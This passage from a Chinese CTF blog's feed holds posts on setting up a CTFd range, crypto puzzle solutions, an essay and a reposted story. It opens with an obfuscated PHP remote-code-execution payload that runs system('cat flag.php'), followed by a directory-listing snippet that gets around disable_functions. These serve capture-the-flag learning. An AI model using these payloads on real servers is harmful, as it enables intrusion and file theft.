class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>%<span class="hljs-number">24</span>____%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___(%<span class="hljs-number">2</span> <span class="hljs-number">4</span>_%<span class="hljs-number">5</span>B_%<span class="hljs-number">5</span>D)%<span class="hljs-number">3</span>B<br>&amp;_=system(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br><br><br></code></pre></td></tr></table></figure><p>重点: 此payload可用于php5的rce里，从而并非像p牛所说的，php5只能用include去rce</p><h4 id="方式二、用disabled-function的方式限制函数"><a href="#方式二、用disabled-function的方式限制函数" class="headerlink" title="方式二、用disabled_function的方式限制函数"></a>方式二、用disabled_function的方式限制函数</h4><p>这就要从根源说起了，在php.ini里通常会有一个配置，来禁用函数，通常会把执行系统命令的函数给ban了，这时候有两种思路</p><h5 id="利用php自身函数去读文件"><a href="#利用php自身函数去读文件" class="headerlink" title="利用php自身函数去读文件"></a>利用php自身函数去读文件</h5><p>例如题目给了flag在/flag里面，现在想要去读文件，那咋整？php也有许多自身函数可以去读，例如highlight_file()，show_source()，都可以用来读文件，那如果不知道flag在哪怎么办？还有方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    <br>可以写一个小poc脚本上去扫目录 然后去读就行<br></code></pre></td></tr></table></figure><h5 id="绕过攻击"><a href="#绕过攻击" class="headerlink" title="绕过攻击"></a>绕过攻击</h5><p>参考</p><h5 id="https-www-freebuf-com-articles-network-263540-html"><a href="#https-www-freebuf-com-articles-network-263540-html" class="headerlink" title="https://www.freebuf.com/articles/network/263540.html"></a><a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></h5><p>然后然后可以用suid去提权</p><p><a href="https://www.freebuf.com/articles/web/272617.html">https://www.freebuf.com/articles/web/272617.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>安全研究</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手把手搭一个靶场并出题</title>
    <link href="/2021/10/31/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%B9%B6%E5%87%BA%E9%A2%98/"/>
    <url>/2021/10/31/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%B9%B6%E5%87%BA%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<blockquote><p>心血来潮搭建了一个靶场并出了人生中第一道CTF题，感觉挺有成就感，就写下这篇文章记录一下。</p></blockquote><h1 id="Step1-初始化docker环境"><a href="#Step1-初始化docker环境" class="headerlink" title="Step1 初始化docker环境"></a>Step1 初始化docker环境</h1><p>去购买一个云服务器(阿里云、腾讯云、华为云都可)，设置系统为Ubuntu20.04(我自己是这种版本，其他版本用我这种方法可能会报错)</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">cd /root<br><br>vi init.sh<br></code></pre></td></tr></table></figure><p>然后在init里面写入以下内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">更新系统</span><br>sudo apt-get update<br>sudo apt-get upgrade<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">安装 docker和docker-compose</span><br>sudo apt install docker docker-compose zip<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">设置镜像加速器</span><br>sudo mkdir -p /etc/docker<br>sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;<br>&#123;<br>  &quot;registry-mirrors&quot;: [&quot;https://faalpdo3.mirror.aliyuncs.com&quot;]<br>&#125;<br>EOF<br>sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod +x init.sh<br><br>./init.sh<br><br></code></pre></td></tr></table></figure><p>遇到问句就 y</p><h1 id="step2-搭建CTFd"><a href="#step2-搭建CTFd" class="headerlink" title="step2 搭建CTFd"></a>step2 搭建CTFd</h1><h2 id="1-拉取CTFd"><a href="#1-拉取CTFd" class="headerlink" title="1.拉取CTFd"></a>1.拉取CTFd</h2><p>在服务器面板里开放端口(我这里以8000为例)</p><p><img src="/2021/10/31/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%B9%B6%E5%87%BA%E9%A2%98/image-20211031203539148.png" alt="image-20211031203539148"></p><p>直接利用docker拉取镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -p 8000:8000 -d ctfd/ctfd<br></code></pre></td></tr></table></figure><p>然后去访问url+端口号</p><p>会有初始化的界面，去设置一下管理员员账号密码等一些配置信息即可</p><h2 id="2-汉化ctfd"><a href="#2-汉化ctfd" class="headerlink" title="2.汉化ctfd"></a>2.汉化ctfd</h2><p><img src="/2021/10/31/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%B9%B6%E5%87%BA%E9%A2%98/image-20211031203901602.png" alt="image-20211031203901602"></p><p>首先利用docker ps去查看id，然后利用id进入docker容器里面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it de6fe1167985 /bin/bash<br></code></pre></td></tr></table></figure><p>先去下载汉化包，直接用git命令去拉取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/Gu-f/CTFd_chinese_CN.git<br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">切换到CTFd目录 删除主题<br>rm -rf themes<br><br>然后把下载好的主题以及对应的版本cp过来<br>cp /opt/CTFd/CTFd_chinese_CN/V3.1.1/CTFd-3.1.1/CTFd/themes .<br></code></pre></td></tr></table></figure><p><img src="/2021/10/31/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%B9%B6%E5%87%BA%E9%A2%98/image-20211031204430496.png" alt="image-20211031204430496"></p><p>刷新下界面，就发现变成了中文，至此ctfd搭建完成</p><h1 id="step3-出题"><a href="#step3-出题" class="headerlink" title="step3 出题"></a>step3 出题</h1><p>之前去测试环境，都是直接用宝塔去搭建的本地服务，这种方法有时候会出现很大的问题，例如搭建的环境存在写shell的地方，你的服务器很容易就被别人当做肉鸡来抓，有很多这种情况，去fofa上一搜，就能抓到很多肉鸡</p><p>既然是出题，那就高端一点，利用dokcer去搭建环境，本次出题借鉴了一些别的比赛的源码，此题为天翼杯魔改的，</p><h2 id="1-编写Dockerfile"><a href="#1-编写Dockerfile" class="headerlink" title="1.编写Dockerfile"></a>1.编写Dockerfile</h2><p>利用的是Dockerfile生成的images 然后run</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> sakadonohito/php5.<span class="hljs-number">6.23</span>-apache<br><br><span class="hljs-keyword">LABEL</span><span class="bash"> Author=<span class="hljs-string">&quot;Air&quot;</span></span><br><br><span class="hljs-keyword">COPY</span><span class="bash"> ./src/ /var/www/html/</span><br><br><span class="hljs-keyword">RUN</span><span class="bash"> chmod -R 755 /var/www/html/ &amp;&amp; \</span><br><span class="bash">    chown -R root:root /var/www/html </span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-keyword">CMD</span><span class="bash"> sh -c <span class="hljs-string">&quot;apache2-foreground&quot;</span></span><br><br></code></pre></td></tr></table></figure><h2 id="2-在src目录下准备好源码"><a href="#2-在src目录下准备好源码" class="headerlink" title="2.在src目录下准备好源码"></a>2.在src目录下准备好源码</h2><p><img src="/2021/10/31/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%B9%B6%E5%87%BA%E9%A2%98/image-20211101113904514.png"></p><h2 id="Step-4-运行docker"><a href="#Step-4-运行docker" class="headerlink" title="Step 4 运行docker"></a>Step 4 运行docker</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build -t trick:v3 .   // .的意思是把当前目录下的文件都给打包<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -p 7000:80 -d trick:v3<br></code></pre></td></tr></table></figure><p>然后把东西题目信息通过ctfd平台的后台管理界面传上去即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>安全研究</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Life</title>
    <link href="/2021/10/30/Life/"/>
    <url>/2021/10/30/Life/</url>
    
    <content type="html"><![CDATA[<h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>​        好久没有写随笔了，自从高三之后，就没有再安安稳稳地握一次笔，脑中就没有再冒出些奇思妙想，似乎所有的灵感都在高一高二用光了，似乎没有什么可写的了。</p><p>​        来海大已经一年了，经过高三高考的挫折以及高四的奋斗，我终于来到了我的远方，这里有海有酒有自由的生活，但是我却觉得缺点什么。</p><p>​        我原以为上大学之后会有大把的时间供我去阅读，去阅读那些高中非常想看但却没有机会看的故事，去他们的世界中体悟人生，但是大学并未如我所愿，课程也挺烦杂，虽然比起高中而言确实是有大把的时间去干自己想干的事，但是我却无暇顾及阅读，而只是对着冰冷的液晶屏幕或刷知乎或刷抖音或玩游戏或敲代码。孔子、孟子 、庄子、老子，都被我抛诸于脑后，甚至于高中最喜欢的王阳明我也都快给忘了，碎片化的信息获取方式让我忘记了如何去深度思考。</p><p>​        这样一来，时间对于我来说过的便是飞快了。逝者如斯夫，不舍昼夜。转眼间我已经来到了大二，我回望大一这一年，也没干过什么有用的大事，高中时候常挂在嘴边的“为天地立心，为生民立命，为往圣继绝学，为万世开太平”似乎也成了一句玩笑话，我的感知也逐渐变得麻木，从前觉得非常重要的事，现在对我已经没有什么触动了。</p><p>​        对于专业课的学习，我也没有如何去听讲，虽然在一周前的省赛里侥幸拿了一等奖，但是我深知自己与外校的一些从高中甚至初中小学就接触这行的师傅有着较大的差距，借用毛主席的一句话就是“革命尚未成功，同志仍需努力”。过分夸赞就如同糖衣炮弹一般，虽然可能本意是好的，但是时间长了就会击碎我的意志，所以还是批评要来的痛快，它可以鞭策我前进，希望看到这里的师傅多多批评我，让我找到自己的不足，才好继续努力。</p><p>​        我在学习CTF有关知识时看到了phith0n的<a href="https://www.leavesongs.com/">Blog</a>，上面写着，一个想当文人的黑客。我看到这里会心一笑，这倒是与我有几分相似，我在认识at0de师傅之前从未要想当hacker，只是初高中阅读过一些所谓的刷钻教程，自己尝试利用社会工程学把同学的QQ号盗了而已，也可以说大学之前，我并未触碰到真正的计算机技术。我虽然选择的是理科，但是我对于文字也十分感兴趣，脑中时常也会出现奇思妙想，我惊叹于诗词的寥寥数字，便能描绘出无穷的意境，引人入胜。</p><p>​        未来海大之前，我曾言:”或云尚未佩妥剑，转眼便江湖；我云，锐已配妥剑，江湖都任我闯。”我刚来海大的前几个月确实也是雄心壮志，参加了许多比赛，能报的不能报的都去打了，确实也是在蓝洞杯中拿了一个校赛二等奖。最害怕的演讲比赛也去参加了，排名靠尾地拿了一个安慰奖，属实是太拉了。</p><p>​        我依旧没有学会合理规划时间，每天还是想起来有啥就做啥，学习方面还没有坚持</p><p>​        </p><p>​        </p>]]></content>
    
    
    
    <tags>
      
      <tag>杂文</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hero</title>
    <link href="/2021/10/27/hero/"/>
    <url>/2021/10/27/hero/</url>
    
    <content type="html"><![CDATA[<h1 id="英雄"><a href="#英雄" class="headerlink" title="英雄"></a>英雄</h1><p>江湖上，人人都承认的高手并不多。<br>欧阳乾坤算一个。<br>欧阳乾坤不姓欧阳，也不叫乾坤。<br>他本名叫刘满堂。<br>名字是奶奶取的，农村人取名字朴实，希望将来刘家能四世同堂。</p><p>刘满堂并没想着要行走江湖。他娶了个媳妇，买两亩地，盖三间大瓦房，生一窝孩子。一件事情改变了这一切。<br>江湖上，正邪不两立，邪教已被正派人士屠戮殆尽，只剩下一个教主还负隅顽抗。<br>正派人士一路追杀，追到了刘满堂所在的村子。<br>教主身受重伤，却没有人愿意给他致命一击。<br>理由很简单，但凡英雄，下场往往不好，实权派永远躲在英雄背后。<br>正派人士都懂这个道理。僵持。<br>正派人士不动手，也不允许教主自杀。<br>直到刘满堂背着一捆柴经过。<br>正派人士告知刘满堂，杀人跟杀猪并无区别，你有两条路，你杀了他，给你二十两银子。你不杀他，我们去拜访你邻居和你媳妇。邸报的标题我都写好了，邪教入村，村民遭殃，妇孺牛羊被屠戮一空。邪教教主死在了刘满堂柴刀下。<br>刘满堂成了英雄。正派人士觉得刘满堂这个名字不大气，就给他改了个名字。<br>从此，刘满堂成了欧阳乾坤，欧阳乾坤成了英雄。<br>欧阳乾坤手刃邪教教主的事迹被大肆渲染，越来越神乎其神，欧阳乾坤成了传说中的英雄。十年之后。<br>邪教兴起，兵临城下，正派人士绑了欧阳乾坤求和。<br>冤有头债有主。<br>人是欧阳乾坤杀的。<br>欧阳乾坤求饶，我不是什么欧阳乾坤，我叫刘满堂，我是个农民。<br>没有人相信。欧阳乾坤被邪教分尸而死。<br>正邪两派达成一致，和平相处十余年。十余年后，战争再起。<br>欧阳乾坤被写进了史书和传奇。<br>二十年前，欧阳乾坤手刃邪教教主。<br>十年前，欧阳乾坤被邪教擒住，百般折磨而不屈服，犹痛骂贼人，至死不绝。</p><p>英雄，有的是用处。</p><p>作者：宋小君<br>链接：<a href="https://www.zhihu.com/question/25313930/answer/102031499">https://www.zhihu.com/question/25313930/answer/102031499</a><br>来源：知乎</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂文</tag>
      
      <tag>摘抄</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学刷题</title>
    <link href="/2021/10/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%B7%E9%A2%98/"/>
    <url>/2021/10/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<blockquote><p>备战省赛，做点简单的密码学题</p></blockquote><h1 id="抄错的字符"><a href="#抄错的字符" class="headerlink" title="抄错的字符"></a>抄错的字符</h1><p>老师让小明抄写一段话，结果粗心的小明把部分数字抄成了字母，还因为强迫症把所有字母都换成大写。你能帮小明恢复并解开答案吗：QWIHBLGZZXJSXZNVBZW</p><p>先全转化为小写看看</p><p>qwihblgzzxjsxznvbzw   1-&gt;i 6-&gt;b 2-&gt;z  9-&gt;g 5-&gt;s</p><p>太牛马了</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$list</span>=[];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>,<span class="hljs-variable">$index</span>=<span class="hljs-number">0</span></span>)</span>&#123;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$index</span>==strlen(<span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$list</span>;<br>        <span class="hljs-variable">$ret</span>=base64_decode(<span class="hljs-variable">$str</span>);<br>        <span class="hljs-variable">$list</span>[]=<span class="hljs-variable">$ret</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$head</span>=substr(<span class="hljs-variable">$str</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$index</span>);<br>    <span class="hljs-variable">$mid</span>=substr(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$index</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$end</span>=substr(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$index</span>+<span class="hljs-number">1</span>,strlen(<span class="hljs-variable">$str</span>)-<span class="hljs-variable">$index</span>);<br>    <span class="hljs-variable">$words</span>=getWord(<span class="hljs-variable">$mid</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$words</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>        <span class="hljs-variable">$newStr</span>=<span class="hljs-variable">$head</span>.<span class="hljs-variable">$v</span>;<br>        <span class="hljs-variable">$ret</span>=base64_decode(<span class="hljs-variable">$newStr</span>);<br>        <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z\d\_\-]/is&#x27;</span>,<span class="hljs-variable">$ret</span>))&#123;<br>            fun(<span class="hljs-variable">$newStr</span>.<span class="hljs-variable">$end</span>,<span class="hljs-variable">$index</span>+<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getWord</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>    <span class="hljs-variable">$word</span>=[<span class="hljs-string">&quot;I&quot;</span>=&gt;<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;L&#x27;</span>=&gt;<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;G&#x27;</span>=&gt;<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;Z&#x27;</span>=&gt;<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;S&#x27;</span>=&gt;<span class="hljs-number">5</span>];<br>    <span class="hljs-variable">$arr</span>=[<span class="hljs-variable">$c</span>,strtolower(<span class="hljs-variable">$c</span>)];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$word</span>[<span class="hljs-variable">$c</span>]))&#123;<br>        <span class="hljs-variable">$arr</span>[]=<span class="hljs-variable">$word</span>[<span class="hljs-variable">$c</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br>&#125;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;QWIHBLGZZXJSXZNVBZW&quot;</span>;<br>fun(<span class="hljs-variable">$str</span>);<br>var_dump(<span class="hljs-variable">$list</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>找到了一个php的脚本，跑一下 得出了结果</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">flag</span><span class="hljs-template-variable">&#123;Aman_very_cool&#125;</span><br></code></pre></td></tr></table></figure><h1 id><a href="#" class="headerlink" title="/.-"></a>/.-</h1><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">..-./.-../.-/--./----.--/-../...--/..-./-.-./-.../..-./.----/--.../..-./----./...--/----./----./...../-----/....-/-----.-<br></code></pre></td></tr></table></figure><p>摩斯密码 ，最后全是小写 注意大小写就行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;d<span class="hljs-number">3</span>fcbf<span class="hljs-number">17</span>f<span class="hljs-number">9399504</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h1><p>一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}</p><p>栅栏密码</p><p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p><p>字数为2，直接解密就行</p><h1 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h1><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook.Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br></code></pre></td></tr></table></figure><p>ok加密</p><p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>flag{0a394df55312c51a}</p><h1 id="lt-gt"><a href="#lt-gt" class="headerlink" title="[+-&lt;&gt;]"></a>[+-&lt;&gt;]</h1><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck">++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;++ ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span>&lt;<span class="hljs-title">]</span> &gt;++<span class="hljs-string">.</span><span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> <span class="hljs-string">.</span>&lt;++<span class="hljs-literal">+</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;-- <span class="hljs-literal">-</span>&lt;<span 